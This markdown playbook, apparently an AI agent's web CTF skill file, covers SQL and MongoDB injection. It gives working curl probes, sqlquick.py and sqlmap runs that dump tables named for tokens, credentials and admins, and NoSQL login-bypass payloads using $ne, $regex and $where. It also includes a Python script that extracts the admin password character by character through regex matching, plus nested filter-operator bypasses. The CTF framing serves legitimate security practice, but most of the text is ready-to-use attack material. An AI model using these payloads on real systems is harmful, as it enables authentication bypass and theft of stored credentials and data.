# Injection — SQLi and NoSQLi

## C. SQLi — search, filter, login, id params

Quick probe:
```bash
curl -si "<target>/api/search?q=test'" $AUTH_HEADER
curl -si "<target>/api/search?q=1+OR+1=1--" $AUTH_HEADER
curl -si "<target>/api/items/1'" $AUTH_HEADER
```

DB error, changed row count, or changed length → **run `sqlquick.py` before sqlmap.** It's a
low-volume fast-track for exactly this signal on a single GET parameter: baseline, then a quote,
then boolean true/false pairs across a few closing forms (numeric, numeric+comment, quoted-string,
parenthesized) — stopping at the first strong true/false differential instead of grinding through
every form. A quote producing a DB error is *never* reported as SQLi on its own; only the boolean
differential confirms it. Once confirmed it binary-searches the `ORDER BY` column boundary, verifies
with a numbered `UNION SELECT`, and dumps SQLite tables whose name matches a priority keyword
(`flag`, `secret`, `config`, `setting`, `user`, `admin`, `token`, `note`, `credential`, `account`)
through that same UNION, stopping the moment a flag shows up:

```bash
python3 ~/.claude/skills/web-ctf/scripts/sqlquick.py --url "<target>/api/search?q=1" --token "$TOKEN"
# param is inferred when the URL has exactly one query param; otherwise pass --param
python3 ~/.claude/skills/web-ctf/scripts/sqlquick.py --url "<target>/api/items?id=1&sort=name" \
  --param id --cookie "session=<value>"
```

It's rate-limit aware by default (0.55s between requests, two backoff retries on `429` at ~3s then
~6s) and **aborts as inconclusive rather than reporting a negative** if throttling persists past
that — a run that never got a clean answer is not evidence the parameter is safe. If it comes back
inconclusive, slow down (`--delay`) and re-run before concluding anything, and don't let a 429-heavy
sqlmap run stand as a negative either.

If `sqlquick.py` misses or you need deeper technique coverage (blind time-based, second-order,
stacked queries, DB fingerprinting), escalate to sqlmap:
```bash
sqlmap -u "<target>/api/search?q=test" \
  --headers="Authorization: Bearer $TOKEN" --batch --level 2 --risk 2 --dbs \
  --output-dir ~/Tools/CTF/<challenge-name>/exploits/sqlmap

# cookie auth
sqlmap -u "<target>/api/search?q=test" \
  --cookie="<name>=<value>" --batch --level 2 --risk 2 --dbs \
  --output-dir ~/Tools/CTF/<challenge-name>/exploits/sqlmap
```

### Confirm it's interpolation, not a bound parameter

A `{"error":"Database error"}` on non-numeric input looks exactly like unparameterized SQL but is also what a **bound parameter** does when the driver rejects a type. Discriminate with arithmetic before building any payload:

| Input | Interpolated | Bound param |
|---|---|---|
| `2` | 2 rows | 2 rows |
| `1+1` | **2 rows** | **error** |
| `(2)` | 2 rows | error |
| `abc` | error | error |

If `1+1` errors, there is no injection — stop and record it killed. This burned real time on Tanuki's `?limit=` param.

Two more traps on numeric/`LIMIT` params:
- **SQLite rejects `UNION` after `LIMIT`** (it must be the final clause), so a failed UNION there proves nothing either way.
- SQLite *does* allow expressions in `LIMIT`, so where interpolation is real, **row count is a clean oracle**: `LIMIT (CASE WHEN <cond> THEN 1 ELSE 0 END)` → 1 row vs 0 rows. Offsets are unreliable if the query uses `ORDER BY RANDOM()` — check whether repeated identical requests return different rows before trusting position.

## K. NoSQL injection — Mongo operators

Trigger: `mongoose`/`mongodb` in `package.json`, or `pymongo`.

```bash
# auth bypass
curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":""}}'
curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
  -d '{"username":{"$regex":".*"},"password":{"$ne":""}}'
curl -si -X POST <target>/api/login -d 'username=admin&password[$ne]=x'

# $where JS execution (older MongoDB)
curl -si "<target>/api/users?filter[\$where]=sleep(2000)" $AUTH_HEADER
```

Blind extraction by regex prefix:
```bash
python3 << 'EOF'
import requests, string
target = "<target>/api/login"
charset = string.ascii_letters + string.digits + "_{}-"
known = ""
while True:
    for c in charset:
        r = requests.post(target, json={"username":"admin","password":{"$regex":f"^{known}{c}"}}, verify=False)
        if r.status_code == 200 and "wrong" not in r.text.lower() and "invalid" not in r.text.lower():
            known += c; print(f"[+] {known}"); break
    else:
        print(f"[done] {known}"); break
EOF
```

### Hidden nested filter params

A generically-named param (`filter`, `where`, `query`, `criteria`) may accept a **two-level nested** object even when a flat value looks inert. Flat `filter=X` producing identical output to omitting it does **not** mean the param is unused — CopyPasta-010's `filter[is_public][$ne]=true` only reacted once both field name and operator were nested:

```bash
curl -si "<target>/api/<listing>?filter[<field>][\$ne]=true" $AUTH_HEADER
curl -si "<target>/api/<listing>?filter[<field>][\$exists]=true" $AUTH_HEADER
```

Take candidate `<field>` names from the boolean/flag fields the endpoint's own JSON already returns (`is_public`, `is_admin`, `role`, `deleted`).
